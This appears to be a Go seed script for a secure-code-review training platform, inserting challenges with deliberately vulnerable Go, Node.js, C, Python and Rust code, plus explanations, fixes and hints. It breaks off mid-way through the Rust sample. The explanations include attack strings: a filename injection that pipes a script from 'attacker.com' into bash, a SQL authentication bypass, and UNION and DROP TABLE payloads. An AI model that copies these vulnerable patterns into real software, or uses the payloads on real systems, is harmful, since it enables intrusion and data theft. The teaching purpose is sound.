package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/joho/godotenv"
	"github.com/vulnarena/vulnarena/internal/database"
	"github.com/vulnarena/vulnarena/internal/model"
	"github.com/vulnarena/vulnarena/internal/repository"
)

func main() {
	_ = godotenv.Load()

	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		dbURL = "postgres://vulnarena:vulnarena_secret@localhost:5432/vulnarena?sslmode=disable"
	}

	ctx := context.Background()
	pool, err := database.NewPostgres(ctx, dbURL)
	if err != nil {
		log.Fatalf("failed to connect to database: %v", err)
	}
	defer pool.Close()

	challengeRepo := repository.NewChallengeRepository(pool)
	lessonRepo := repository.NewLessonRepository(pool)
	achievementRepo := repository.NewAchievementRepository(pool)

	// Ensure extra languages and categories exist before seeding challenges
	ensureExtraLookups(ctx, pool)

	// Seed challenges
	challenges := buildChallenges()
	for _, ch := range challenges {
		lang, err := challengeRepo.GetLanguageBySlug(ctx, ch.langSlug)
		if err != nil {
			log.Fatalf("language %q not found: %v", ch.langSlug, err)
		}
		cat, err := challengeRepo.GetVulnCategoryBySlug(ctx, ch.catSlug)
		if err != nil {
			log.Fatalf("category %q not found: %v", ch.catSlug, err)
		}

		var cveRef *string
		if ch.cveReference != "" {
			cveRef = &ch.cveReference
		}

		challenge := &model.Challenge{
			ID:                  uuid.New(),
			Title:               ch.title,
			Slug:                ch.slug,
			Description:         ch.description,
			Difficulty:          ch.difficulty,
			LanguageID:          lang.ID,
			VulnCategoryID:      cat.ID,
			VulnerableCode:      ch.code,
			TargetVulnerability: ch.targetVuln,
			ConceptualFix:       ch.conceptualFix,
			VulnerableLines:     ch.vulnerableLines,
			CVEReference:        cveRef,
			Hints:               ch.hints,
			Points:              ch.points,
			LineCount:           len(strings.Split(ch.code, "\n")),
			IsPublished:         true,
		}

		if err := challengeRepo.Insert(ctx, challenge); err != nil {
			log.Fatalf("failed to insert challenge %q: %v", ch.slug, err)
		}
		fmt.Printf("[+] Challenge: %-50s (Level %d, %s, %s)\n", ch.title, ch.difficulty, ch.langSlug, ch.catSlug)
	}
	fmt.Printf("Seeded %d challenges.\n\n", len(challenges))

	// Seed lessons
	lessons := buildLessons()
	for _, ls := range lessons {
		lesson := &model.Lesson{
			ID:          uuid.New(),
			Title:       ls.title,
			Slug:        ls.slug,
			Category:    ls.category,
			Description: ls.description,
			Content:     ls.content,
			Difficulty:  ls.difficulty,
			ReadTimeMin: ls.readTimeMin,
			Tags:        ls.tags,
			IsPublished: true,
		}

		if err := lessonRepo.Insert(ctx, lesson); err != nil {
			log.Fatalf("failed to insert lesson %q: %v", ls.slug, err)
		}
		fmt.Printf("[+] Lesson:    %-50s (%s, Level %d)\n", ls.title, ls.category, ls.difficulty)
	}
	fmt.Printf("Seeded %d lessons.\n\n", len(lessons))

	// Seed achievements
	achievements := buildAchievements()
	for _, ach := range achievements {
		a := &model.Achievement{
			ID:          uuid.New(),
			Slug:        ach.slug,
			Name:        ach.name,
			Description: ach.description,
			IconSVG:     ach.iconSVG,
			Category:    ach.category,
			XPReward:    ach.xpReward,
		}

		if err := achievementRepo.Insert(ctx, a); err != nil {
			log.Fatalf("failed to insert achievement %q: %v", ach.slug, err)
		}
		fmt.Printf("[+] Achievement: %-30s (%s, +%d XP)\n", ach.name, ach.category, ach.xpReward)
	}
	fmt.Printf("Seeded %d achievements.\n", len(achievements))
}

type challengeSeed struct {
	title           string
	slug            string
	description     string
	difficulty      int
	langSlug        string
	catSlug         string
	code            string
	targetVuln      string
	conceptualFix   string
	hints           []string
	points          int
	vulnerableLines []int
	cveReference    string
}

func ensureExtraLookups(ctx context.Context, pool *pgxpool.Pool) {
	langs := []struct{ slug, name string }{
		{"php", "PHP"},
		{"bash", "Bash / Shell"},
	}
	for _, l := range langs {
		_, _ = pool.Exec(ctx,
			`INSERT INTO languages (slug, name) VALUES ($1, $2) ON CONFLICT (slug) DO NOTHING`,
			l.slug, l.name)
	}

	cats := []struct{ slug, name, desc, owasp string }{
		{"prototype-pollution", "Prototype Pollution", "Manipulating JavaScript object prototypes to inject properties.", "A08:2021"},
		{"logic-flaw", "Logic Flaw / Business Logic", "Flaws in application logic allowing unintended behavior.", ""},
		{"auth-bypass", "Authentication Bypass", "Circumventing authentication mechanisms to gain unauthorized access.", "A07:2021"},
		{"llm-injection", "LLM / AI Prompt Injection", "Injecting adversarial prompts to manipulate LLM behavior and exfiltrate data.", ""},
		{"xxe", "XML External Entity (XXE)", "Exploiting XML parsers to read files, perform SSRF, or execute remote code.", "A05:2021"},
		{"ssti", "Server-Side Template Injection", "Injecting template directives into server-side template engines to achieve RCE.", "A03:2021"},
		{"ci-cd-injection", "CI/CD Pipeline Injection", "Injecting malicious commands into CI/CD pipeline configurations.", ""},
		{"dom-clobbering", "DOM Clobbering", "Overwriting DOM properties via HTML injection to hijack client-side logic.", "A03:2021"},
		{"request-smuggling", "HTTP Request Smuggling", "Exploiting discrepancies in HTTP parsing between front-end and back-end servers.", ""},
		{"mass-assignment", "Mass Assignment", "Binding user-controlled input to internal object fields without whitelisting.", "A04:2021"},
		{"redos", "ReDoS", "Crafting input that causes catastrophic backtracking in regular expressions.", ""},
		{"path-traversal", "Path Traversal", "Accessing files outside intended directories via directory traversal sequences.", "A01:2021"},
		{"cache-poisoning", "Web Cache Poisoning", "Manipulating cache keys to serve malicious content to other users.", ""},
	}
	for _, c := range cats {
		var owasp *string
		if c.owasp != "" {
			owasp = &c.owasp
		}
		_, _ = pool.Exec(ctx,
			`INSERT INTO vuln_categories (slug, name, description, owasp_ref) VALUES ($1, $2, $3, $4) ON CONFLICT (slug) DO NOTHING`,
			c.slug, c.name, c.desc, owasp)
	}
	fmt.Println("Ensured extra languages and categories exist.")
}

func buildChallenges() []challengeSeed {
	base := []challengeSeed{
		challenge1_GoSQLi(),
		challenge2_NodeCmdInjection(),
		challenge3_CBufferOverflow(),
		challenge4_FlaskSQLi(),
		challenge5_RustMemory(),
		challenge6_CppRCE(),
	}
	all := append(base, buildCVEChallenges()...)
	return append(all, buildModernChallenges()...)
}

// ──────────────────────────────────────────────────
// CHALLENGE 1: Level 2 — Subtle SQL Injection in Go
// ──────────────────────────────────────────────────
func challenge1_GoSQLi() challengeSeed {
	return challengeSeed{
		title:      "The Phantom Query — Go Auth Bypass",
		slug:       "go-sqli-phantom-query",
		difficulty: 2,
		langSlug:   "go",
		catSlug:    "injection",
		points:     150,
		description: `You are reviewing a Go microservice that handles user authentication
for an internal tool. The developer used the standard database/sql package
and claims the login function is "secure because we hash passwords."

Your mission: Identify the vulnerability, explain how an attacker could
exploit it, and describe the correct remediation approach.

CONTEXT: This service runs behind an internal load balancer and processes
~2000 login attempts per minute. The users table contains 50,000 records
including service accounts with elevated privileges.`,

		code: `package auth

import (
    "crypto/sha256"
    "database/sql"
    "encoding/hex"
    "fmt"
    "log"
    "net/http"
    "strings"
)

type AuthService struct {
    db *sql.DB
}

func (s *AuthService) LoginHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    username := strings.TrimSpace(r.FormValue("username"))
    password := r.FormValue("password")

    if username == "" || password == "" {
        http.Error(w, "Missing credentials", http.StatusBadRequest)
        return
    }

    // Hash the password before comparing
    hash := sha256.Sum256([]byte(password))
    passwordHash := hex.EncodeToString(hash[:])

    // Look up the user with matching credentials
    query := fmt.Sprintf(
        "SELECT id, role FROM users WHERE username = '%s' AND password_hash = '%s'",
        username,
        passwordHash,
    )

    var userID int
    var role string
    err := s.db.QueryRow(query).Scan(&userID, &role)
    if err != nil {
        if err == sql.ErrNoRows {
            http.Error(w, "Invalid credentials", http.StatusUnauthorized)
            return
        }
        log.Printf("Database error: %v", err)
        http.Error(w, "Internal error", http.StatusInternalServerError)
        return
    }

    // Create session for authenticated user
    log.Printf("User %d authenticated with role: %s", userID, role)
    w.Header().Set("Content-Type", "application/json")
    fmt.Fprintf(w, ` + "`" + `{"user_id": %d, "role": "%s", "status": "authenticated"}` + "`" + `, userID, role)
}`,

		targetVuln: `SQL injection vulnerability. The query on lines 36-39 uses fmt.Sprintf
to construct a SQL query with direct string interpolation of the username parameter.
Although the password is hashed (making password injection harder), the username
field is directly concatenated into the query without parameterization. An attacker
can inject SQL via the username field to bypass authentication entirely. The
subtlety is that the developer may believe hashing the password makes this safe,
but the username field remains the injection vector. An attacker could use
' OR 1=1 -- as the username to retrieve the first user (often an admin), or use
UNION SELECT to extract arbitrary data. The sha256 hashing provides zero protection
against injection through the username parameter.`,

		conceptualFix: `Use parameterized queries (prepared statements) instead of string
concatenation. Replace fmt.Sprintf with placeholder parameters ($1, $2 for PostgreSQL
or ? for MySQL). The corrected query should be:
db.QueryRow("SELECT id, role FROM users WHERE username = $1 AND password_hash = $2", username, passwordHash).
This ensures the database driver properly escapes all user input. Additionally,
consider using bcrypt instead of SHA-256 for password hashing, as SHA-256 is too
fast for password storage and vulnerable to rainbow table attacks. Input validation
on the username field (alphanumeric + limited special chars) provides defense in depth.`,

		hints: []string{
			"The developer hashed the password — but is that the only user input in the query?",
			"Look at how the SQL query string is constructed. What function is used?",
			"Research how fmt.Sprintf differs from parameterized queries in Go's database/sql package.",
		},
	}
}

// ──────────────────────────────────────────────────
// CHALLENGE 2: Level 5 — OS Command Injection in Node.js
// ──────────────────────────────────────────────────
func challenge2_NodeCmdInjection() challengeSeed {
	return challengeSeed{
		title:      "The Silent Pipe — Node.js Image Processor",
		slug:       "nodejs-cmd-injection-image-proc",
		difficulty: 5,
		langSlug:   "nodejs",
		catSlug:    "cmd-injection",
		points:     350,
		description: `A Node.js microservice handles image processing for a SaaS platform.
Users can upload images and specify output format conversions. The service
uses ImageMagick via a shell wrapper for the actual conversions.

A junior developer implemented the conversion endpoint and it passed code
review. The service is deployed behind an API gateway with JWT auth, so
"only authenticated users can reach it."

Find the vulnerability that makes authentication irrelevant to the attack's
severity. Explain the full attack chain and the proper fix.

CONTEXT: The service runs as www-data on an Ubuntu container with network
access to the internal Redis cluster and PostgreSQL database.`,

		code: `const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const multer = require('multer');

const app = express();
const upload = multer({ dest: '/tmp/uploads/' });

// Supported output formats
const ALLOWED_FORMATS = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp', 'tiff'];

/**
 * POST /api/convert
 * Converts uploaded image to the specified format.
 * Requires valid JWT (handled by API gateway).
 */
app.post('/api/convert', upload.single('image'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No image file provided' });
    }

    const outputFormat = req.body.format || 'png';

    // Validate the requested output format
    if (!ALLOWED_FORMATS.includes(outputFormat.toLowerCase())) {
        // Clean up uploaded file
        fs.unlinkSync(req.file.path);
        return res.status(400).json({
            error: 'Unsupported format',
            allowed: ALLOWED_FORMATS
        });
    }

    const inputPath = req.file.path;
    const outputFilename = req.body.filename || 'converted';
    const outputPath = path.join('/tmp/output', ` + "`" + `${outputFilename}.${outputFormat}` + "`" + `);

    // Ensure output directory exists
    fs.mkdirSync('/tmp/output', { recursive: true });

    // Use ImageMagick to convert the image
    const command = ` + "`" + `convert "${inputPath}" -quality 85 -strip "${outputPath}"` + "`" + `;

    exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
        // Clean up input file
        fs.unlinkSync(inputPath);

        if (error) {
            console.error(` + "`" + `Conversion failed: ${stderr}` + "`" + `);
            return res.status(500).json({ error: 'Conversion failed' });
        }

        // Send the converted file
        res.download(outputPath, ` + "`" + `${outputFilename}.${outputFormat}` + "`" + `, (err) => {
            // Clean up output file after sending
            if (fs.existsSync(outputPath)) {
                fs.unlinkSync(outputPath);
            }
        });
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', service: 'image-converter' });
});

app.listen(3001, () => {
    console.log('Image converter service running on port 3001');
});`,

		targetVuln: `OS Command Injection via the filename parameter. While the output format
is validated against an allowlist (ALLOWED_FORMATS), the filename parameter from
req.body.filename is used without any sanitization in the shell command on line 43.
The filename is interpolated into outputPath which is then passed to exec().

An attacker can inject shell metacharacters through the filename parameter. For example,
setting filename to: converted"; curl http://attacker.com/shell.sh | bash; echo "
would break out of the quoted string and execute arbitrary commands. The exec() function
from child_process spawns a shell (/bin/sh) which interprets these metacharacters.

The vulnerability is subtle because: (1) the format IS validated, giving false confidence,
(2) the path.join on line 37 doesn't sanitize shell metacharacters, it only handles
path separators, (3) the command uses double quotes around the path which can be escaped,
(4) the service runs with network access to internal infrastructure (Redis, PostgreSQL),
making lateral movement possible.

This is a command injection vulnerability, not just a path traversal, because the
constructed path is passed to exec() which invokes a shell.`,

		conceptualFix: `Multiple layers of remediation are needed:

1. CRITICAL: Replace exec() with execFile() or spawn() with an arguments array.
execFile('convert', [inputPath, '-quality', '85', '-strip', outputPath]) does NOT
spawn a shell, so metacharacters are treated as literal filename characters.

2. Sanitize the filename: strip or reject any characters outside [a-zA-Z0-9._-].
Use a regex allowlist: outputFilename.replace(/[^a-zA-Z0-9._-]/g, '_').

3. Alternatively, ignore user-provided filenames entirely and generate a UUID-based
output filename server-side, only using the user's name in the Content-Disposition header.

4. Defense in depth: run the container with minimal permissions, no network access
to internal services (network policy), and use seccomp/AppArmor profiles to restrict
syscalls.

The key principle is: never pass user-controlled data through a shell interpreter.
Use APIs that accept argument arrays instead of command strings.`,

		hints: []string{
			"The format validation is solid. But what about the OTHER user-controlled parameter?",
			"Look at what function from child_process is used. How does exec() differ from execFile()?",
			"What happens when shell metacharacters like \"; or $() appear inside double quotes passed to /bin/sh?",
		},
	}
}

// ──────────────────────────────────────────────────
// CHALLENGE 3: Level 8 — Buffer Overflow in C
// ──────────────────────────────────────────────────
func challenge3_CBufferOverflow() challengeSeed {
	return challengeSeed{
		title:      "Stack Ghosts — C Log Processor Overflow",
		slug:       "c-buffer-overflow-log-processor",
		difficulty: 8,
		langSlug:   "c",
		catSlug:    "memory-corruption",
		points:     600,
		description: `You are auditing a C program that processes structured log entries from
network devices. The program runs as a daemon with root privileges on a
gateway server, reading log data from a UDP socket.

The original developer left the company and documentation is sparse. The
binary has been running in production for 3 years without changes. A recent
penetration test flagged "potential memory safety issues" but the ops team
dismissed it as a false positive.

This is real-world legacy code. Find ALL memory safety vulnerabilities,
explain the most critical attack vector, and describe how to fix the code
without breaking its functionality.

CONTEXT: Compiled with gcc -O2 on x86_64 Linux. No ASLR on the host
(legacy kernel). Stack canaries are disabled in the build flags (-fno-stack-protector).`,

		code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_LOG_ENTRY  1024
#define LOG_FILE       "/var/log/netdevice.log"
#define LISTEN_PORT    5514

/* Log entry structure from network devices */
typedef struct {
    char timestamp[20];      /* "2024-01-15 14:30:00" */
    char hostname[64];
    char severity[16];       /* "INFO", "WARN", "ERROR", "CRITICAL" */
    char message[256];
    char source_ip[16];      /* IPv4 dotted-decimal */
} log_entry_t;

/* Parse a raw log line into the structured format.
 * Expected format: "TIMESTAMP|HOSTNAME|SEVERITY|MESSAGE|SOURCE_IP"
 */
int parse_log_entry(const char *raw, log_entry_t *entry) {
    char buffer[MAX_LOG_ENTRY];
    char *token;
    char *saveptr;

    /* Copy raw input to mutable buffer for tokenization */
    strcpy(buffer, raw);

    token = strtok_r(buffer, "|", &saveptr);
    if (!token) return -1;
    strcpy(entry->timestamp, token);

    token = strtok_r(NULL, "|", &saveptr);
    if (!token) return -1;
    strcpy(entry->hostname, token);

    token = strtok_r(NULL, "|", &saveptr);
    if (!token) return -1;
    strcpy(entry->severity, token);

    token = strtok_r(NULL, "|", &saveptr);
    if (!token) return -1;
    strcpy(entry->message, token);

    token = strtok_r(NULL, "|", &saveptr);
    if (!token) return -1;
    strcpy(entry->source_ip, token);

    return 0;
}

/* Format and write the parsed entry to the log file */
void write_log_entry(FILE *logfile, const log_entry_t *entry) {
    char formatted[512];

    sprintf(formatted, "[%s] %-16s %-8s %s (from %s)\n",
            entry->timestamp,
            entry->hostname,
            entry->severity,
            entry->message,
            entry->source_ip);

    fputs(formatted, logfile);
    fflush(logfile);
}

/* Filter: only log entries with severity WARN or above */
int should_log(const log_entry_t *entry) {
    return (strcmp(entry->severity, "WARN") == 0 ||
            strcmp(entry->severity, "ERROR") == 0 ||
            strcmp(entry->severity, "CRITICAL") == 0);
}

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char recv_buffer[MAX_LOG_ENTRY];
    log_entry_t entry;
    FILE *logfile;

    logfile = fopen(LOG_FILE, "a");
    if (!logfile) {
        perror("Failed to open log file");
        exit(EXIT_FAILURE);
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(LISTEN_PORT);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Log processor listening on UDP port %d\n", LISTEN_PORT);

    /* Main processing loop */
    while (1) {
        ssize_t n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer), 0,
                             (struct sockaddr *)&client_addr, &client_len);

        if (n <= 0) continue;

        /* Null-terminate the received data */
        recv_buffer[n] = '\0';

        if (parse_log_entry(recv_buffer, &entry) == 0) {
            if (should_log(&entry)) {
                write_log_entry(logfile, &entry);
                printf("Logged: %s from %s\n", entry.severity, entry.source_ip);
            }
        }
    }

    fclose(logfile);
    close(sockfd);
    return 0;
}`,

		targetVuln: `Multiple buffer overflow and memory corruption vulnerabilities exist:

1. CRITICAL — strcpy overflow in parse_log_entry (line 33): The function uses
strcpy(buffer, raw) to copy the raw input into a fixed 1024-byte buffer. However,
recvfrom on line 110 reads UP TO sizeof(recv_buffer) = 1024 bytes. After null
termination on line 113 (recv_buffer[n] = '\0'), if exactly 1024 bytes are received,
the null is written at index 1024, a one-byte off-by-one overflow on recv_buffer itself.
But more critically, the raw data passed to parse_log_entry could be up to 1024 bytes,
and strcpy does not check bounds.

2. CRITICAL — Field overflow via strcpy (lines 36-48): Each token extracted from the
pipe-delimited string is copied into fixed-size struct fields using strcpy without
bounds checking. The hostname field is 64 bytes, severity is 16 bytes, source_ip is
16 bytes, etc. An attacker can craft a log entry with a hostname field longer than 64
bytes, overflowing into adjacent struct members on the stack. Since the struct is
stack-allocated and stack canaries are disabled, this enables stack buffer overflow
leading to return address overwrite and arbitrary code execution.

3. HIGH — sprintf overflow in write_log_entry (line 62): The formatted buffer is 512
bytes, but the combined length of all fields could exceed 512 bytes (20 + 16 + 8 + 256 +
16 + format characters ≈ 350 bytes nominal, but if fields are already overflowed with
long data, sprintf will write past the 512-byte buffer).

4. MEDIUM — Off-by-one on recv_buffer (line 113): recv_buffer[n] where n can equal
sizeof(recv_buffer) = 1024, writing the null terminator one byte past the buffer.

The most critical attack vector: An attacker sends a crafted UDP packet to port 5514
with an oversized hostname field. Since there is no authentication on the UDP socket,
no ASLR, and no stack canaries, the attacker can overwrite the return address of
parse_log_entry to redirect execution to shellcode embedded in the message field.
The daemon runs as root, giving the attacker immediate root code execution.`,

		conceptualFix: `Comprehensive remediation:

1. Replace all strcpy calls with strncpy (or better, strlcpy where available).
Each field copy must specify the destination buffer size minus one for null termination:
strncpy(entry->hostname, token, sizeof(entry->hostname) - 1);
entry->hostname[sizeof(entry->hostname) - 1] = '\0';

2. Replace sprintf with snprintf, specifying the buffer size:
snprintf(formatted, sizeof(formatted), "[%s] %-16s ...", ...);

3. Fix the off-by-one: change recvfrom to read sizeof(recv_buffer) - 1 bytes,
ensuring space for null termination, or check that n < sizeof(recv_buffer) before
writing the null terminator.

4. Add input length validation before parsing: if the received packet exceeds a
reasonable maximum, reject it.

5. Validate individual field lengths after tokenization before copying.

6. Enable compiler protections: compile with -fstack-protector-strong, enable ASLR,
use -D_FORTIFY_SOURCE=2 for runtime buffer overflow detection.

7. Drop root privileges after binding the socket (setuid to a service account).

8. Consider rewriting the parser using safe string handling libraries, or migrate
critical parsing to a memory-safe language.`,

		hints: []string{
			"Compare the sizes of the struct fields (hostname: 64, source_ip: 16) with the possible length of tokens from the input.",
			"What function is used to copy each token into the struct fields? Does it check the destination buffer size?",
			"The daemon reads UDP packets. Is there any authentication? What happens if an attacker sends a crafted packet with a 200-byte 'hostname'?",
		},
	}
}

// ──────────────────────────────────────────────────
// CHALLENGE 4: Level 3 — Flask SQL Injection (CVE-2019-inspired)
// Inspired by real-world ORM misuse patterns
// ──────────────────────────────────────────────────
func challenge4_FlaskSQLi() challengeSeed {
	return challengeSeed{
		title:        "The Leaky ORM — Flask Product Search",
		slug:         "flask-sqli-leaky-orm",
		difficulty:   3,
		langSlug:     "python",
		catSlug:      "injection",
		points:       200,
		cveReference: "CVE-2019-7164 (SQLAlchemy text() misuse pattern)",
		vulnerableLines: []int{47, 48, 49, 50, 51},
		description: `A Flask e-commerce application exposes a product search endpoint.
The developer uses SQLAlchemy but bypasses the ORM's built-in protection
in a critical code path. The application serves ~500 concurrent users and
the products table contains sensitive wholesale pricing data.

Your mission: Review the source code, identify the exact vulnerable lines,
explain the injection vector, and describe the proper fix using SQLAlchemy's
safe query patterns.

CONTEXT: This pattern was identified in multiple real-world applications
after CVE-2019-7164 highlighted unsafe uses of SQLAlchemy's text() construct.
The application connects to PostgreSQL with a database user that has SELECT
privileges on all tables including the users table.`,

		code: `from flask import Flask, request, jsonify
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker
import logging
import re

app = Flask(__name__)
engine = create_engine('postgresql://app:secret@db:5432/shop')
Session = sessionmaker(bind=engine)

logger = logging.getLogger(__name__)

# Product categories for validation
VALID_CATEGORIES = ['electronics', 'clothing', 'books', 'home', 'sports']


@app.route('/api/products/search', methods=['GET'])
def search_products():
    """Search products with optional filters.

    Query params:
        q: search term (required)
        category: product category filter
        min_price: minimum price filter
        max_price: maximum price filter
        sort: sort field (name, price, rating)
        order: sort direction (asc, desc)
    """
    search_term = request.args.get('q', '').strip()
    if not search_term or len(search_term) < 2:
        return jsonify({'error': 'Search term must be at least 2 characters'}), 400

    if len(search_term) > 100:
        return jsonify({'error': 'Search term too long'}), 400

    category = request.args.get('category', '')
    min_price = request.args.get('min_price', type=float)
    max_price = request.args.get('max_price', type=float)
    sort_field = request.args.get('sort', 'name')
    sort_order = request.args.get('order', 'asc')

    # Build the base query with user's search term
    session = Session()
    try:
        # Build dynamic query for flexible searching
        query_str = f"""
            SELECT id, name, description, price, category, rating, stock_count
            FROM products
            WHERE name ILIKE '%{search_term}%'
            OR description ILIKE '%{search_term}%'
        """

        # Apply category filter (validated against allowlist)
        if category:
            if category not in VALID_CATEGORIES:
                return jsonify({'error': 'Invalid category'}), 400
            query_str += f" AND category = '{category}'"

        # Apply price range filters
        if min_price is not None:
            query_str += f" AND price >= {min_price}"
        if max_price is not None:
            query_str += f" AND price <= {max_price}"

        # Apply sorting (validated)
        valid_sorts = {'name', 'price', 'rating'}
        valid_orders = {'asc', 'desc'}
        if sort_field in valid_sorts and sort_order.lower() in valid_orders:
            query_str += f" ORDER BY {sort_field} {sort_order}"
        else:
            query_str += " ORDER BY name ASC"

        query_str += " LIMIT 50"

        result = session.execute(text(query_str))
        products = []
        for row in result:
            products.append({
                'id': row[0],
                'name': row[1],
                'description': row[2],
                'price': float(row[3]),
                'category': row[4],
                'rating': float(row[5]) if row[5] else None,
                'stock_count': row[6]
            })

        logger.info(f"Search '{search_term}': {len(products)} results")
        return jsonify({
            'products': products,
            'total': len(products),
            'query': search_term
        })

    except Exception as e:
        logger.error(f"Search error: {e}")
        return jsonify({'error': 'Search failed'}), 500
    finally:
        session.close()


@app.route('/api/products/<int:product_id>', methods=['GET'])
def get_product(product_id):
    """Get a single product by ID (safe - uses parameterized query)."""
    session = Session()
    try:
        result = session.execute(
            text("SELECT * FROM products WHERE id = :id"),
            {'id': product_id}
        )
        row = result.fetchone()
        if not row:
            return jsonify({'error': 'Product not found'}), 404

        return jsonify({
            'id': row[0],
            'name': row[1],
            'description': row[2],
            'price': float(row[3]),
            'category': row[4]
        })
    finally:
        session.close()


@app.route('/api/categories', methods=['GET'])
def list_categories():
    """List valid product categories."""
    return jsonify({'categories': VALID_CATEGORIES})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)`,

		targetVuln: `SQL injection via f-string interpolation in the search query construction
(lines 47-51). The search_term from user input is directly interpolated into the SQL
query string using Python f-strings. Despite using SQLAlchemy's text() function to
execute the query, the query string itself is built with unsanitized user input.

The developer validates the search term length and validates the category against an
allowlist, creating a false sense of security. However, the search_term is embedded
directly into the ILIKE clauses via f-string formatting:
  WHERE name ILIKE '%{search_term}%'

An attacker can inject SQL through the search parameter. For example:
  q=%'; DROP TABLE products; --
  q=%' UNION SELECT id,username,password_hash,1,1,1,1 FROM users --

This would execute arbitrary SQL because the text() function passes the raw string
to the database. The key insight is that SQLAlchemy's text() provides no protection
when the SQL string itself is constructed with string formatting — it only provides
parameterization when used with :param placeholders.

Note: The get_product endpoint (line 100) correctly uses parameterized queries with
text("SELECT * FROM products WHERE id = :id") — showing the developer knows the safe
pattern but chose the unsafe approach for the search functionality.`,

		conceptualFix: `Use SQLAlchemy's parameterized queries with bound parameters:

Replace the f-string interpolation with :param placeholders:
  query_str = text("""
      SELECT id, name, description, price, category, rating, stock_count
      FROM products
      WHERE name ILIKE :search OR description ILIKE :search
  """)
  params = {'search': f'%{search_term}%'}
  result = session.execute(query_str, params)

This ensures the database driver properly escapes the search term. The ILIKE
wildcards should be added to the parameter value, not embedded in the SQL.

Alternatively, use SQLAlchemy ORM with the ilike() method:
  Product.query.filter(
      or_(Product.name.ilike(f'%{search_term}%'),
          Product.description.ilike(f'%{search_term}%'))
  )

Additional defense-in-depth:
1. Escape SQL wildcard characters (%, _) in the search term if literal matching is intended
2. Use a read-only database user for search queries
3. Implement query result limits at the database level
4. Add rate limiting to prevent automated SQL injection scanning`,

		hints: []string{
			"Compare how the search endpoint builds its query vs. how the get_product endpoint does it.",
			"Look at the Python f-string syntax in the SQL query construction. What happens if search_term contains a single quote?",
			"SQLAlchemy's text() function does not auto-escape — it only helps when you use :param placeholders.",
		},
	}
}

// ──────────────────────────────────────────────────
// CHALLENGE 5: Level 7 — Rust Unsafe Memory (CVE-inspired)
// Use-after-free via unsafe block misuse
// ──────────────────────────────────────────────────
func challenge5_RustMemory() challengeSeed {
	return challengeSeed{
		title:        "Unsafe Territory — Rust Cache Corruption",
		slug:         "rust-unsafe-memory-cache",
		difficulty:   7,
		langSlug:     "rust",
		catSlug:      "memory-corruption",
		points:       500,
		cveReference: "CVE-2022-21658 (unsafe memory pattern in Rust)",
		vulnerableLines: []int{63, 64, 65, 95, 96, 98, 99, 103, 104},
		description: `A high-performance Rust cache server uses unsafe code blocks to achieve
zero-copy deserialization and manual memory management for hot-path
optimization. The service handles ~100K requests/second and any latency
regression is unacceptable to the team.

A senior engineer wrote the unsafe blocks during a performance sprint and
they have been running in production for 6 months. The codebase has extensive
safe Rust tests but the unsafe paths are not covered by Miri or sanitizers.

Find the memory safety violations hidden in the unsafe blocks. Explain how
they violate Rust's aliasing and lifetime guarantees, what undefined behavior
they enable, and how to fix them without sacrificing the performance goals.

CONTEXT: Compiled with rustc 1.75.0 in release mode with LTO. The binary
runs as a systemd service processing financial transaction cache entries.
Memory corruption here could lead to incorrect financial data.`,

		code: `use std::alloc::{alloc, dealloc, Layout};
use std::collections::HashMap;
use std::ptr;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

/// A cache entry stored with manual memory management for performance.
/// Layout: [u64 expires_at][u32 len][u8; len data]
struct RawCacheEntry {
    ptr: *mut u8,
    layout: Layout,
}

impl RawCacheEntry {
    /// Create a new cache entry with the given TTL and data.
    fn new(data: &[u8], ttl: Duration) -> Self {
        let header_size = std::mem::size_of::<u64>() + std::mem::size_of::<u32>();
        let total_size = header_size + data.len();
        let layout = Layout::from_size_align(total_size, 8).unwrap();

        unsafe {
            let ptr = alloc(layout);
            if ptr.is_null() {
                std::alloc::handle_alloc_error(layout);
            }

            // Write expiration timestamp
            let expires_at = Instant::now()
                .elapsed()
                .as_secs()
                .wrapping_add(ttl.as_secs());
            ptr::write(ptr as *mut u64, expires_at);

            // Write data length
            ptr::write(ptr.add(8) as *mut u32, data.len() as u32);

            // Copy data
            ptr::copy_nonoverlapping(data.as_ptr(), ptr.add(12), data.len());

            RawCacheEntry { ptr, layout }
        }
    }

    /// Check if this entry has expired.
    fn is_expired(&self) -> bool {
        unsafe {
            let expires_at = ptr::read(self.ptr as *const u64);
            let now = Instant::now().elapsed().as_secs();
            now > expires_at
        }
    }

    /// Get a reference to the cached data.
    /// SAFETY: Caller must ensure the entry is still valid.
    fn data(&self) -> &[u8] {
        unsafe {
            let len = ptr::read(self.ptr.add(8) as *const u32) as usize;
            std::slice::from_raw_parts(self.ptr.add(12), len)
        }
    }
}

impl Drop for RawCacheEntry {
    fn drop(&mut self) {
        unsafe {
            dealloc(self.ptr, self.layout);
        }
    }
}

/// Thread-safe cache with manual memory management.
struct FastCache {
    entries: Arc<Mutex<HashMap<String, RawCacheEntry>>>,
}

impl FastCache {
    fn new() -> Self {
        FastCache {
            entries: Arc::new(Mutex::new(HashMap::new())),
        }
    }

